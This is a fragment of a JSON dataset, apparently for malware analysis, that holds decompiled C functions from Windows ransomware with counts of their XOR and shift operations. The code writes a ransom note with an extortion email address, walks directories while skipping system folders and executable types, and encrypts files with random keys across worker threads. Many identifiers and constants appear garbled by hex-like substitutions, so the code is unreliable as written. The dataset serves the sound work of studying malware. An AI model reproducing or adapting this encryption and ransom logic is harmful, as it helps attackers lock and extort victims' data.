        "Function Body": "\nint __fastcall sub_4028F9(HCFBDFPROV a1, HCFBDFKEY a2, LPB7EAR lpFileName, int a4)\n{\n  int v4; // esi\n  HA0019 FirstFileW; // eax\n  int (__stdcall *v6)(LPB7EAR); // edi\n  int v7; // esi\n  int v8; // eax\n  void *v9; // esi\n  size_t v10; // eax\n  size_t v11; // eax\n  HA0019 FileW; // edi\n  PWSTR (__stdcall *v13)(PC1113, PC1113); // ebx\n  int (__stdcall *v14)(LPB7EAR, LPB7EAR); // esi\n  int v15; // esi\n  int v16; // esi\n  int v17; // esi\n  int v18; // eax\n  void *v19; // esi\n  size_t v20; // eax\n  size_t v21; // eax\n  size_t v22; // eax\n  struct _RTL_CR90A0AL_SE9A44N *v23; // edi\n  _DWORD *v24; // eax\n  _DWORD *v25; // eax\n  int v26; // esi\n  int v27; // esi\n  int v28; // eax\n  void *v29; // esi\n  size_t v30; // eax\n  size_t v31; // eax\n  unsigned __int8 *v32; // edi\n  unsigned __int8 *v33; // ebx\n  rsize_t v35; // [esp-4h] [ebp-2DCh]\n  rsize_t v36; // [esp-4h] [ebp-2DCh]\n  rsize_t v37; // [esp-4h] [ebp-2DCh]\n  HA0019 hFindFile; // [esp+18h] [ebp-2C0h]\n  LPB7EAR lpString2; // [esp+20h] [ebp-2B8h]\n  const wchar_t *v42; // [esp+24h] [ebp-2B4h]\n  const wchar_t *v43; // [esp+28h] [ebp-2B0h]\n  const wchar_t *v44; // [esp+2Ch] [ebp-2ACh]\n  const wchar_t *v45; // [esp+30h] [ebp-2A8h]\n  const wchar_t *v46; // [esp+34h] [ebp-2A4h]\n  const wchar_t *v47; // [esp+38h] [ebp-2A0h]\n  const wchar_t *v48; // [esp+3Ch] [ebp-29Ch]\n  const wchar_t *v49; // [esp+40h] [ebp-298h]\n  const wchar_t *v50; // [esp+44h] [ebp-294h]\n  const wchar_t *v51; // [esp+48h] [ebp-290h]\n  const wchar_t *v52; // [esp+4Ch] [ebp-28Ch]\n  const wchar_t *v53; // [esp+50h] [ebp-288h]\n  const wchar_t *v54; // [esp+54h] [ebp-284h]\n  const wchar_t *v55; // [esp+58h] [ebp-280h]\n  const wchar_t *v56; // [esp+5Ch] [ebp-27Ch]\n  const wchar_t *v57; // [esp+60h] [ebp-278h]\n  const wchar_t *v58; // [esp+64h] [ebp-274h]\n  const wchar_t *v59; // [esp+68h] [ebp-270h]\n  const wchar_t *v60; // [esp+6Ch] [ebp-26Ch]\n  const wchar_t *v61; // [esp+70h] [ebp-268h]\n  const wchar_t *v62; // [esp+74h] [ebp-264h]\n  DWORD NumberOfBytesWritten; // [esp+7Ch] [ebp-25Ch] BYREF\n  struct _WIN32_FIND_DATAW FindFileData; // [esp+80h] [ebp-258h] BYREF\n\n  memset(&FindFileData, 0, sizeof(FindFileData));\n  v4 = -1;\n  FirstFileW = FindFirstFileW(lpFileName, &FindFileData);\n  hFindFile = FirstFileW;\n  if ( FirstFileW == (HA0019)-1 )\n  {\nLABEL_39:\n    FindClose(FirstFileW);\n    return v4;\n  }\n  v6 = lstrlenW;\n  v7 = lstrlenW(lpFileName);\n  v8 = lstrlenW(L\"restore_file.txt\");\n  v9 = calloc(__CFADD__(v8 + v7, 2) ? -1 : v8 + v7 + 2, 2u);\n  if ( v9 )\n  {\n    v35 = lstrlenW(lpFileName) - 1;\n    v10 = _msize(v9);\n    wcsncpy_s((wchar_t *)v9, v10 >> 1, lpFileName, v35);\n    v11 = _msize(v9);\n    wcscat_s((wchar_t *)v9, v11 >> 1, L\"restore_file.txt\");\n    FileW = CreateFileW((LPB7EAR)v9, 0x40989C00u, 2u, 0, 1u, 0x80u, 0);\n    if ( FileW != (HA0019)-1 )\n    {\n      NumberOfBytesWritten = 0;\n      WriteFile(\n        FileW,\n        \"-------------------------------------------------------------------------------\\r\\n\"\n        \"----------- [ Hello! ] ------------->\\r\\n\"\n        \"\\r\\n\"\n        \"       ****BY BLUE LODEC9****\\r\\n\"\n        \"\\r\\n\"\n        \"What happend?\\r\\n\"\n        \"----------------------------------------------\\r\\n\"\n        \"Your computers and servers are encrypted, backups are deleted from your network and copied. We use strong encryp\"\n        \"tion algorithms, so you cannot decrypt your data.\\r\\n\"\n        \"But you can restore everything by purchasing a special program from us - a universal decoder. This program will \"\n        \"restore your entire network.\\r\\n\"\n        \"Follow our instructions below and you will recover all your data.\\r\\n\"\n        \"If you continue to ignore this for a long time, we will start reporting the hack to mainstream media and posting\"\n        \" your data to the dark web.\\r\\n\"\n        \"\\r\\n\"\n        \"What guarantees?\\r\\n\"\n        \"----------------------------------------------\\r\\n\"\n        \"We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our intere\"\n        \"sts.\\r\\n\"\n        \"All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case\"\n        \" of problems.\\r\\n\"\n        \"We guarantee to decrypt one file for free. email us.\\r\\n\"\n        \"\\r\\n\"\n        \"How to contact us?\\r\\n\"\n        \"----------------------------------------------\\r\\n\"\n        \"You can write us to our mailbox : grepmord@protonmail.com\\r\\n\"\n        \"\\r\\n\"\n        \"!!! DA74E5 !!!\\r\\n\"\n        \"DO NOT MOEFE8 or try to REE8F8R any files yourself. We WILL NOT be able to RE139AE them.\\r\\n\"\n        \"!!! DA74E5 !!\\r\\n\"\n        \"\\r\\n\",\n        0x548u,\n        &NumberOfBytesWritten,\n        0);\n      CloseHandle(FileW);\n    }\n    j___free_base(v9);\n    v6 = lstrlenW;\n  }\n  v13 = StrStrIW;\n  v14 = lstrcmpW;\n  do\n  {\n    if ( (!v13(FindFileData.cFileName, L\"Microsoft\") || v13(FindFileData.cFileName, L\"Microsoft SQL Server\"))\n      && v14(FindFileData.cFileName, L\".\")\n      && v14(FindFileData.cFileName, L\"..\")\n      && (FindFileData.dwFileAttributes & 0x400) == 0 )\n    {\n      if ( (FindFileData.dwFileAttributes & 0x10) != 0 )\n      {\n        if ( FindFileData.cFileName[0] == 46 )\n          goto LABEL_37;\n        lpString2 = L\"AppData\";\n        v15 = 0;\n        v42 = L\"tmp\";\n        v43 = L\"winnt\";\n        v44 = L\"temp\";\n        v45 = L\"thumb\";\n        v46 = L\"REABC3ER\";\n        v47 = L\"$Recycle.Bin\";\n        v48 = L\"$REABC3E.BIN\";\n        v49 = L\"System Volume Information\";\n        v50 = L\"Boot\";\n        v51 = L\"Windows\";\n        v52 = L\"$WI3372S.~BT\";\n        v53 = L\"Windows.old\";\n        v54 = L\"PerfLog\";\n        v55 = L\"Microsoft\";\n        while ( lstrcmpiW(FindFileData.cFileName, (&lpString2)[v15]) )\n        {\n          if ( ++v15 >= 15 )\n          {\n            v16 = v6(lpFileName);\n            v17 = v6(L\"\\\\*\") + v16;\n            v18 = v6(FindFileData.cFileName);\n            v19 = calloc(__CFADD__(v17 + v18, 2) ? -1 : v17 + v18 + 2, 2u);\n            if ( !v19 )\n              break;\n            v36 = v6(lpFileName) - 1;\n            v20 = _msize(v19);\n            wcsncpy_s((wchar_t *)v19, v20 >> 1, lpFileName, v36);\n            v21 = _msize(v19);\n            wcscat_s((wchar_t *)v19, v21 >> 1, FindFileData.cFileName);\n            v22 = _msize(v19);\n            wcscat_s((wchar_t *)v19, v22 >> 1, L\"\\\\*\");\n            v23 = (struct _RTL_CR90A0AL_SE9A44N *)(a4 + 8);\n            EnterCriticalSection((LPCR90A0AL_SE9A44N)(a4 + 8));\n            v24 = calloc(8u, 1u);\n            if ( v24 )\n            {\n              *v24 = 0;\n              v24[1] = 0;\n              if ( !*(_DWORD *)(a4 + 32) )\n              {\n                *(_DWORD *)(a4 + 32) = v24;\n                *(_DWORD *)(a4 + 36) = v24;\n                *v24 = v19;\n                LeaveCriticalSection(v23);\n                break;\n              }\n              *(_DWORD *)(*(_DWORD *)(a4 + 36) + 4) = v24;\n              v25 = *(_DWORD **)(*(_DWORD *)(a4 + 36) + 4);\n              *(_DWORD *)(a4 + 36) = v25;\n              *v25 = v19;\n            }\n            LeaveCriticalSection(v23);\n            break;\n          }\n        }\n      }\n      else\n      {\n        lpString2 = L\".exe\";\n        v26 = 0;\n        v42 = L\".dll\";\n        v43 = L\".sys\";\n        v44 = L\".com\";\n        v45 = L\".msi\";\n        v46 = L\".mui\";\n        v47 = L\".inf\";\n        v48 = L\".cat\";\n        v49 = L\".bat\";\n        v50 = L\".cmd\";\n        v51 = L\".ps1\";\n        v52 = L\".vbs\";\n        v53 = L\".ttf\";\n        v54 = L\".fon\";\n        v55 = L\".lnk\";\n        v56 = L\".ini\";\n        v57 = L\".log\";\n        v58 = L\".blue\";\n        v59 = L\"restore_file.txt\";\n        v60 = L\"NT26C3.DAT\";\n        v61 = L\"ntldr\";\n        v62 = L\"bootmgr\";\n        while ( !v13(FindFileData.cFileName, (&lpString2)[v26]) )\n        {\n          if ( ++v26 >= 22 )\n          {\n            v27 = v6(lpFileName);\n            v28 = v6(FindFileData.cFileName);\n            v29 = calloc(__CFADD__(v28 + v27, 2) ? -1 : v28 + v27 + 2, 2u);\n            if ( v29 )\n            {\n              v37 = v6(lpFileName) - 1;\n              v30 = _msize(v29);\n              wcsncpy_s((wchar_t *)v29, v30 >> 1, lpFileName, v37);\n              v31 = _msize(v29);\n              wcscat_s((wchar_t *)v29, v31 >> 1, FindFileData.cFileName);\n              v32 = (unsigned __int8 *)calloc(0x100u, 1u);\n              if ( v32 )\n              {\n                v33 = (unsigned __int8 *)calloc(8u, 1u);\n                if ( v33 )\n                {\n                  if ( CryptGenRandom(a1, 0x100u, v32) && CryptGenRandom(a1, 8u, v33) )\n                    sub_40453D(a2, (LPB7EAR)v29, v32, v33);\n                  j___free_base(v29);\n                  j___free_base(v32);\n                  j___free_base(v33);\n                }\n                else\n                {\n                  j___free_base(v29);\n                  j___free_base(v32);\n                }\n                v13 = StrStrIW;\n              }\n              else\n              {\n                j___free_base(v29);\n              }\n            }\n            break;\n          }\n        }\n      }\n      v14 = lstrcmpW;\n    }\nLABEL_37:\n    v6 = lstrlenW;\n  }\n  while ( FindNextFileW(hFindFile, &FindFileData) );\n  FirstFileW = hFindFile;\n  v4 = 0;\n  if ( hFindFile )\n    goto LABEL_39;\n  return v4;\n}\n// 41E4EE: using guessed type wchar_t aAppdata[8];\n// 41AB63: using guessed type wchar_t aTmp[4];\n// 410257: using guessed type wchar_t aWinnt[6];\n// 414865: using guessed type wchar_t aTemp[5];\n// 416EF8: using guessed type wchar_t aThumb[6];\n// 417A65: using guessed type wchar_t aRecycler[9];\n// 41874C: using guessed type wchar_t aRecycleBin[13];\n// 41530F: using guessed type wchar_t aRecycleBin_0[13];\n// 4174EA: using guessed type wchar_t aSystemVolumeIn[26];\n// 418D67: using guessed type wchar_t aBoot[5];\n// 41E436: using guessed type wchar_t aWindows[8];\n// 41DF32: using guessed type wchar_t aWindowsBt[13];\n// 412C95: using guessed type wchar_t aWindowsOld[12];\n// 419BD4: using guessed type wchar_t aPerflog[8];\n// 41CBC3: using guessed type wchar_t aExe[5];\n// 41EEEF: using guessed type wchar_t aDll[5];\n// 411426: using guessed type wchar_t aSys[5];\n// 411854: using guessed type wchar_t aCom[5];\n// 410D5D: using guessed type wchar_t aMsi[5];\n// 414764: using guessed type wchar_t aMui[5];\n// 4150AC: using guessed type wchar_t aInf[5];\n// 415DAB: using guessed type wchar_t aCat[5];\n// 418E65: using guessed type wchar_t aBat[5];\n// 41FC7A: using guessed type wchar_t aCmd[5];\n// 4193C3: using guessed type wchar_t aPs1[5];\n// 4186FD: using guessed type wchar_t aVbs[5];\n// 41573F: using guessed type wchar_t aTtf[5];\n// 419392: using guessed type wchar_t aFon[5];\n// 418900: using guessed type wchar_t aLnk[5];\n// 41E711: using guessed type wchar_t aIni[5];\n// 41F14B: using guessed type wchar_t aLog[5];\n// 41E179: using guessed type wchar_t aNtuserDat[11];\n// 4182F1: using guessed type wchar_t aNtldr[6];\n// 4151F7: using guessed type wchar_t aBootmgr[8];\n\n"
    },
    {
        "Function": "sub_40C598",
        "Total XOR and shift operations": 2,
        "XOR operations": 2,
        "Shift operations": 0,
        "Operation percentage": "1.83%",
        "Function Body": "\nvoid __fastcall sub_40C598(__m128i *a1, __m128i *a2, unsigned int a3)\n{\n  unsigned int v3; // edi\n  __m128i *v4; // esi\n  __int8 *v5; // ebx\n  __m128i *v7; // eax\n  int v8; // edx\n  char v9; // cl\n  __m128i v10; // xmm0\n  unsigned int v11; // edx\n  __m128i *v12; // eax\n  __m128i v13; // xmm0\n  __m128i v14; // xmm1\n  __m128i *v15; // ecx\n  unsigned int v16; // edi\n  __int8 v17; // al\n  unsigned int v18; // [esp+8h] [ebp-4Ch]\n  unsigned int v19; // [esp+Ch] [ebp-48h] BYREF\n  __m128i v20; // [esp+10h] [ebp-44h] BYREF\n  __m128i v21[2]; // [esp+20h] [ebp-34h] BYREF\n  __m128i v22; // [esp+40h] [ebp-14h] BYREF\n\n  v3 = a3;\n  v4 = a2;\n  v19 = (unsigned int)a1;\n  if ( a3 )\n  {\n    v5 = (__int8 *)((char *)&v20 - (char *)a2);\n    while ( 1 )\n    {\n      sub_403E89((int)&v20, a1);\n      a1 = (__m128i *)v19;\n      if ( (*(_DWORD *)(v19 + 48))++ == -1 )\n        ++a1[3].m128i_i32[1];\n      if ( v3 <= 0x40 )\n        break;\n      if ( v4 > (__m128i *)((char *)&v22.m128i_u64[1] + 7) || (__m128i *)((char *)&v4[3].m128i_u64[1] + 7) < &v20 )\n      {\n        v3 -= 64;\n        *v4 = _mm_xor_si128(v20, *v4);\n        v10 = v21[1];\n        v4[1] = _mm_xor_si128(v21[0], v4[1]);\n        v4[2] = _mm_xor_si128(v4[2], v10);\n        v4[3] = _mm_xor_si128(v22, v4[3]);\n        v4 += 4;\n        v5 -= 64;\n      }\n      else\n      {\n        v7 = v4;\n        v8 = 64;\n        do\n        {\n          v9 = v7->m128i_i8[(_DWORD)v5];\n          v7 = (__m128i *)((char *)v7 + 1);\n          v7[-1].m128i_i8[15] ^= v9;\n          --v8;\n        }\n        while ( v8 );\n        a1 = (__m128i *)v19;\n        v3 -= 64;\n        v4 += 4;\n        v5 -= 64;\n      }\n    }\n    v11 = 0;\n    if ( v3 )\n    {\n      if ( v3 < 0x40\n        || v4 <= (__m128i *)((char *)&v19 + v3 + 3) && (__m128i *)((char *)&v4[-1].m128i_u64[1] + v3 + 7) >= &v20 )\n      {\n        goto LABEL_19;\n      }\n      v12 = v4 + 2;\n      v19 = v3 & 0xFFBDE0C0;\n      v18 = (char *)v21 - (char *)v4;\n      do\n      {\n        v13 = v12[-2];\n        v12 += 4;\n        v12[-6] = _mm_xor_si128(*(__m128i *)((char *)&v20 + v11), v13);\n        v14 = v21[v11 / 0x10];\n        v11 += 64;\n        v12[-5] = _mm_xor_si128(v14, v12[-5]);\n        v12[-4] = _mm_xor_si128(*(__m128i *)((char *)&v12[-4] + (char *)&v20 - (char *)v4), v12[-4]);\n        v12[-3] = _mm_xor_si128(*(__m128i *)((char *)&v12[-4] + (char *)v21 - (char *)v4), v12[-3]);\n      }\n      while ( v11 < (v3 & 0xFFBDE0C0) );\n      v18 = v11;\n      if ( v11 < v3 )\n      {\nLABEL_19:\n        v15 = &v4[v11 / 0x10];\n        v16 = v3 - v11;\n        do\n        {\n          v17 = v15->m128i_i8[(char *)&v20 - (char *)v4];\n          v15 = (__m128i *)((char *)v15 + 1);\n          v15[-1].m128i_i8[15] ^= v17;\n          --v16;\n        }\n        while ( v16 );\n      }\n    }\n  }\n}\n\n"
    },
    {
        "Function": "StartAddress",
        "Total XOR and shift operations": 1,
        "XOR operations": 0,
        "Shift operations": 1,
        "Operation percentage": "1.82%",
        "Function Body": "\nvoid __stdcall __noreturn StartAddress(char *lpThreadParameter)\n{\n  int i; // esi\n  LPB7EAR *v2; // eax\n  void **v3; // esi\n  int v4; // eax\n  wchar_t *v5; // eax\n  size_t v6; // eax\n  const wchar_t *v7; // [esp-4h] [ebp-20h]\n  wchar_t *Destination; // [esp+Ch] [ebp-10h]\n  HCFBDFKEY phKey; // [esp+10h] [ebp-Ch] BYREF\n  HCFBDFPROV hProv; // [esp+14h] [ebp-8h] BYREF\n\n  if ( sub_40AB9D(&hProv) != -1 && CryptImportKey(hProv, &pbData, 0x214u, 0, 0, &phKey) )\n  {\n    while ( 1 )\n    {\n      for ( i = 0; ; ++i )\n      {\n        if ( i == 5 )\n          goto LABEL_10;\n        EnterCriticalSection((LPCR90A0AL_SE9A44N)(lpThreadParameter + 8));\n        if ( *((_DWORD *)lpThreadParameter + 8) )\n          break;\n        LeaveCriticalSection((LPCR90A0AL_SE9A44N)(lpThreadParameter + 8));\n        Sleep(0x1F4u);\n      }\n      v2 = (LPB7EAR *)sub_405F88(lpThreadParameter);\n      v3 = (void **)v2;\n      if ( v2 )\n      {\n        v4 = lstrlenW(*v2);\n        v5 = (wchar_t *)calloc(__CFADD__(v4, 2) ? -1 : v4 + 2, 2u);\n        Destination = v5;\n        if ( v5 )\n        {\n          v7 = (const wchar_t *)*v3;\n          v6 = _msize(v5);\n          wcscpy_s(Destination, v6 >> 1, v7);\n          sub_40203F(v3);\n          LeaveCriticalSection((LPCR90A0AL_SE9A44N)(lpThreadParameter + 8));\n          sub_4028F9(hProv, phKey, Destination, (int)lpThreadParameter);\n          j___free_base(Destination);\n        }\n      }\n    }\n  }\nLABEL_10:\n  if ( hProv )\n    CryptReleaseContext(hProv, 0);\n  ExitThread(0xFFBDE0FF);\n}\n\n"
    }
]